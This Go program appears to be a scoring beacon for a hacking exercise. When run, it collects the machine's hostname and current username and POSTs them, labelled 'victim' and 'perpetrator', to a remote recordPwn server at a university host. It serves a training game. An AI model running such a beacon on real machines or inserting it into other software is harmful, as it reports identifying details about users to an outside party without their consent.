package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/user"
)

func main() {
	perpPtr := flag.String("by", "anon", "Who to record the score as")
	flag.Parse()

	host, _ := os.Hostname()
	currentUser, _ := user.Current()

	values := map[string]string{"victim": currentUser.Username, "perpetrator": *perpPtr, "host": host}

	jsonBlob, _ := json.Marshal(values)

	_, err := http.Post("http://avari.byu.edu:9999/recordPwn", "application/json; charset=utf-8", bytes.NewBuffer(jsonBlob))

	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf("Recorded pwn by %s on %s for %s\n", *perpPtr, host, currentUser.Username)
	}
}
